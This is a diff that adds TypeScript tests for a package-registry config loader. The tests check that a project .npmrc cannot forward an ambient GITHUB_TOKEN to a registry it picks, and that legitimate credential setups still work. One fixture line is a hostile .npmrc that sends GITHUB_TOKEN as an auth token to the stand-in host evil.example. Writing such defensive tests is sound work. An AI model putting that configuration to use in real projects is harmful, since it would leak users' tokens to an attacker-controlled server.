@@ -154,3 +154,65 @@ describe("loadRegistryConfig", () => {
     }
   });
 });
+
+describe("a project .npmrc cannot send an ambient secret to a registry of its own choosing", () => {
+  const env = (project: string, userFile: string) => ({
+    NPM_CONFIG_USERCONFIG: userFile,
+    GITHUB_TOKEN: "ghs_ambient",
+    NPM_TOKEN: "npm_for_npm",
+    cwd: project,
+  });
+
+  function load(npmrc: string, extraEnv: Record<string, string> = {}) {
+    const dir = mkdtempSync(join(tmpdir(), "registry-config-trust-"));
+    try {
+      const project = join(dir, "project");
+      mkdirSync(project);
+      writeFileSync(join(project, ".npmrc"), npmrc);
+      const merged = { ...env(project, join(dir, "none")), ...extraEnv };
+      return loadRegistryConfig(project, merged);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  }
+
+  it("drops a credential that expands GITHUB_TOKEN for an unknown host", () => {
+    const config = load(
+      `registry=https://evil.example/\n//evil.example/:_authToken=${envRef("GITHUB_TOKEN")}\n`,
+    );
+    expect(config.headersFor("https://evil.example/pkg")).toEqual({});
+  });
+
+  it("keeps a credential from an npm-specific variable", () => {
+    const config = load(
+      `registry=https://private.example/\n//private.example/:_authToken=${envRef("NPM_TOKEN")}\n`,
+    );
+    expect(config.headersFor("https://private.example/pkg")).toEqual({ Authorization: "Bearer npm_for_npm" });
+  });
+
+  it("keeps any variable for the well-known registry hosts, such as GitHub Packages", () => {
+    const config = load(`//npm.pkg.github.com/:_authToken=${envRef("GITHUB_TOKEN")}\n`);
+    expect(config.headersFor("https://npm.pkg.github.com/x")).toEqual({ Authorization: "Bearer ghs_ambient" });
+  });
+
+  it("keeps a literal credential and non-credential keys that expand variables", () => {
+    const config = load(`registry=${envRef("NPM_CONFIG_REGISTRY_BASE")}/\n//x.example/:_authToken=literal\n`, {
+      NPM_CONFIG_REGISTRY_BASE: "https://mirror.example",
+    });
+    expect(config.registryUrlFor("lodash")).toBe("https://mirror.example");
+    expect(config.headersFor("https://x.example/p")).toEqual({ Authorization: "Bearer literal" });
+  });
+
+  it("does not apply the rule to the user's own .npmrc", () => {
+    const dir = mkdtempSync(join(tmpdir(), "registry-config-user-"));
+    try {
+      const userFile = join(dir, "user.npmrc");
+      writeFileSync(userFile, `//corp.example/:_authToken=${envRef("GITHUB_TOKEN")}\n`);
+      const config = loadRegistryConfig(dir, { NPM_CONFIG_USERCONFIG: userFile, GITHUB_TOKEN: "ghs_user" });
+      expect(config.headersFor("https://corp.example/p")).toEqual({ Authorization: "Bearer ghs_user" });
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
